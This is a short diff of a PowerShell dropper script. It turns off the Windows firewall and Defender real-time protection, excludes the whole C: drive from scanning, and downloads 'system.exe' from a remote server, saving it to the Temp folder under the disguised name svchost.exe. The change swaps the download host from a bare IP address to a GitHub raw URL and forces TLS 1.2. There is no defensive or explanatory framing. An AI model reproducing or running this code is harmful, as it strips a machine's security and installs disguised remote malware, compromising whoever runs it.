@@ -2,8 +2,10 @@ Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 Set-MpPreference -DisableRealtimeMonitoring $true
 Add-MpPreference -ExclusionPath C:\
 
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
 $d = "C:\Windows\Temp"
-$s = "http://43.156.115.119"
+$s = "https://raw.githubusercontent.com/liubowen027/1111/refs/heads/main"
 
 $f1 = "$d\svchost.exe"
 (New-Object Net.WebClient).DownloadFile("$s/system.exe", $f1)
